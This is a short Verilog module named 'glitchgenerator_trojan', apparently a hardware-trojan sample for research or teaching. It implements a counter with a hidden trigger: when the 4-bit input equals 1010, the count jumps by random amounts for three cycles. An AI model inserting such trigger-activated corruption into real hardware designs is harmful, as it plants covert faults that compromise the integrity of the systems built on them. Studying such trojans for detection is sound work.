   module glitchgenerator_trojan (
    input clk,
    input rst,
    input [3:0] trigger,
    output reg [3:0] count_trojan
);
    reg glitch;
    reg [1:0] glitch_duration;
   
   
   
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            count_trojan <= 4'b0000;
            glitch <= 0;
            glitch_duration <= 0;
        end
        else begin
            // Activate glitch on trigger
            if (trigger == 4'b1010) begin
                glitch <= 1;
                glitch_duration <= 3;  // Maintain glitch for 3 cycles
            end
            
            // Glitch behavior
            if (glitch && glitch_duration > 0) begin
                count_trojan <= count_trojan + $urandom_range(3,7); // Larger jumps
                glitch_duration <= glitch_duration - 1;
            end
            else begin
                glitch <= 0;
                count_trojan <= count_trojan + 1; // Normal operation
            end
        end
    end
endmodule